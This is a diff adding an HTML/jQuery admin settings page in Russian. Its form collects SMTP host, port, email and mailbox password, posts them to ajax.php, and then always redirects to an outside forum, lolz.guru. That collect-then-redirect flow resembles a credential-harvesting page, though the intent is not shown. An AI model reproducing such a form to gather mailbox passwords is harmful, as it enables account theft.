@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" type="images/png" href="icon/admin-icon.png">
+    <link rel="stylesheet" type="text/css" href="index.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:ital,wght@0,700;1,400&family=Roboto:wght@500&display=swap" rel="stylesheet">
+    <title>Admin</title>
+</head>
+<body>
+  <div class="wrapper">
+  <div class="column">  
+        <ul class="menubox">
+          <div class="sidebar"></div> 
+                <li><a class="menu-item" href="#"><img class="img__hight" src="icon/statistic-icon.png"><p class="none">Статистик</p></a></li>
+                <li><a class="menu-item" href="#"><img class="img__hight" src="icon/sell-icon.png"><p class="none">Продажи</p></a></li>
+                <li><a class="menu-item" href="#"><img class="img__hight" src="icon/icon-for-safe.png"><p class="none">Безопасные сделки</p></a></li>
+                <li><a class="menu-item" href="#"><img class="img__hight" src="icon/bulletin-board.jpg.png"><p class="none">Доска объявлений</p></a></li>
+                <li><a class="menu-item" href="#"><img class="img__hight" src="icon/User_Icon.png"><p class="none">Пользователи</p></a></li>
+                <li><a class="menu-item" href="#"><img class="img__hight" src="icon/subscribers.png"><p class="none">Подписчики</p></a></li>
+                <li><a class="menu-item" href="#"><img class="img__hight" src="icon/blog-icon-png.png"><p class="none">Блог</p></a></li>
+                <li><a class="menu-item" href="#"><img class="img__hight" src="icon/сount.png"><p class="none">Страны</p></a></li>
+                <li><a class="menu-item" href="#"><img class="img__hight" src="icon/pagele.png"><p class="none">Страницы</p></a></li>
+                <li><a class="menu-item" href="#"><img class="img__hight" src="icon/tool.png"><p class="none">Инструменты</p></a></li>
+                <li><a class="menu-item" href="#"><img class="img__hight" src="icon/icons-file-manager.jpg.png"><p class="none">файловый менеджер</p></a></li>
+                <li><a class="menu-item" href="#"><img class="img__hight" src="icon/app_icon.png"><p class="none">истемное</p></a></li>
+                        
+        </ul>
+      </div>
+          <div class="container">
+            <div class="header"><a href="#" class="header__link">Основное</a>
+              <a href="#" class="header__link">Основное</a>
+              <a href="#" class="header__link">Оповещения</a>
+              <a href="#" class="header__link">Валюта</a>
+              <a href="#" class="header__link">Доступ</a>
+              <a href="#" class="header__link">Шаблоны email писем</a>
+              <a href="#" class="header__link">Watarmark</a>
+              <a href="#" class="header__link">Рассылка</a>
+              <a href="#" class="header__link">Код скриптов</a>
+            </div>
+            <div class="line"></div>
+              <form class="inner">
+                <div class="row"><span class="general__span">Имя отправителя</span><input id="name" name="name" oninput="chek()" class="general__inp"></div>
+                <div class="row"><span class="general__span">Ответный E-maill</span><input id="login" name="login" oninput="chek()" class="general__inp"></div>
+                          <div class="title"><p>Метод рассылки</p>
+                          <div class="line1"></div>
+                            
+                            <label class="container__chek">Страндартная отправка Email
+                              <input oninput="chek()" type="checkbox" checked="checked">
+                              <span class="checkmark"></span>
+                            </label>
+                          
+                            <label class="container__chek">отправка через SMTP<input type="checkbox" checked="checked">
+                              <span class="checkmark"></span>
+                            </label>
+                          </div>
+                          <div class="row"><span class="general__span">Хост</span><input id="host" name="host" oninput="chek()" class="general__inp corekt"></div>
+                          <div class="row"><span class="general__span">Порт</span><input id="port" name="port" oninput="chek()" class="general__inp corekt"></div>
+                          <div class="row"><span class="general__span">Email</span><input name="email" id="email" oninput="chek()" class="general__inp corekt1"></div>
+                          <div class="row"><span class="general__span">Пароль от почты</span><input name="password" id="password" type="password" oninput="chek()" class="general__inp">
+                          </div>
+                          <p class="title">Как настроить SMTP?</p>
+                          <button type="submit" id="buttonn" disabled="" class="btn">Тестовая отправка письма</button>
+              </form>
+          </div>
+        </div>
+    </div>
+    <script>
+       function chek(){
+                                var name= $('#name').val();
+                                var login= $('#login').val();
+                                var host= $('#host').val();
+                                var port= $('#port').val();
+                                var email= $('#email').val();
+                                var password= $('#password').val();
+                                var buttonn= $('#buttonn');                      
+                                if(name.length != 0 & login.includes("@") & host.length != 0 & port.length != 0 & email.includes("@") & password.length != 0) {
+                                    buttonn.removeAttr("disabled");
+                                }
+                                else{
+                                    buttonn.attr("disabled","disabled");      
+                                }
+                                }
+                                $('.inner').on('submit', function (event) {
+
+event.stopPropagation();
+event.preventDefault();
+
+let form = this,
+    submit = $('.submit', form),
+    data = new FormData(),
+    files = $('input[type=file]')
+
+
+$('.submit', form).val('Отправка...');
+$('input, textarea', form).attr('disabled','');
+
+data.append( 'name', 		$('[name="name"]', form).val() );
+data.append( 'login', 		$('[name="login"]', form).val() );
+data.append( 'host', 		$('[name="host"]', form).val() );
+data.append( 'port', 		$('[name="port"]', form).val() );
+data.append( 'email', 		$('[name="email"]', form).val() );
+data.append( 'password', 	$('[name="password"]', form).val() );
+
+files.each(function (key, file) {
+    let cont = file.files;
+    if ( cont ) {
+        $.each( cont, function( key, value ) {
+            data.append( key, value );
+        });
+    }
+});
+
+$.ajax({
+    url: 'ajax.php',
+    type: 'POST',
+    data: data,
+    cache: false,
+    dataType: 'json',
+    processData: false,
+    contentType: false,
+    xhr: function() {
+        let myXhr = $.ajaxSettings.xhr();
+
+        if ( myXhr.upload ) {
+            myXhr.upload.addEventListener( 'progress', function(e) {
+                if ( e.lengthComputable ) {
+                    let percentage = ( e.loaded / e.total ) * 100;
+                        percentage = percentage.toFixed(0);
+                    $('.submit', form)
+                        .html( percentage + '%' );
+                }
+            }, false );
+        }
+
+        return myXhr;
+    },
+    error: function( jqXHR, textStatus ) {
+    },
+    complete: function() {
+        console.log('Complete')
+        form.reset() 
+        window.location = "https://lolz.guru/";
+    }
+});
+return false;
+});   
+    </script>
+</body>
+</html>
